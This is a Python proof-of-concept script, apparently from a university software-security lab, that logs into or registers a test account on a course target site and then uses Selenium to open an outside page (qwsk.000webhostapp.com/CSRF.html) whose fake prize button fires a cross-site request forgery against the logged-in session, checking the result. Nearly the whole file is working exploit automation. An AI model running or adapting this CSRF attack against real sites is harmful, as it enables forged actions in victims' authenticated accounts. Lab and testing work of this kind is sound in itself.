import requests, sys, re, time, random, string

params = { 
    'username': 'pentest1',
    'password': 'pentest1'
}
if len(sys.argv) == 2:
    url = sys.argv[1]
else:
    url = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt'

resource = '/login'

s = requests.Session()

path = url + resource
r = s.post(url=path, data=params)

if len(s.cookies) == 0:
    resource = '/register'
    path = url + resource
    r = s.post(url=path, data=params)
    resource = '/login'
    path = url + resource
    r = s.post(url=path, data=params)
    if len(s.cookies) == 0:
        print("Login && registration not successful! :(")
        print("Usage:\n\tpython3 vulnX.py [username] [password]\n")
        exit(2)
    
from selenium.webdriver import Firefox
browser = Firefox()
browser.get('http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt/login')
browser.find_element_by_name('username').send_keys("pentest1")
browser.find_element_by_name('password').send_keys("pentest1")
login_submit = '/html/body/div[2]/div/div[2]/center/form/fieldset/button'
browser.find_element_by_xpath(login_submit).click()

browser.execute_script("window.open('https://qwsk.000webhostapp.com/CSRF.html');")
time.sleep(1)
window_after = browser.window_handles[1]
browser.switch_to.window(window_after)
browser.find_element_by_name('submit').click()
time.sleep(1)
browser.switch_to.alert.accept()
time.sleep(1)
browser.execute_script("window.scrollTo(0, document.body.scrollHeight);")
html_source = browser.page_source

assert "CSRF PoC Done! iPhoone button on https://qwsk.000webhostapp.com/CSRF.html is fake" in html_source
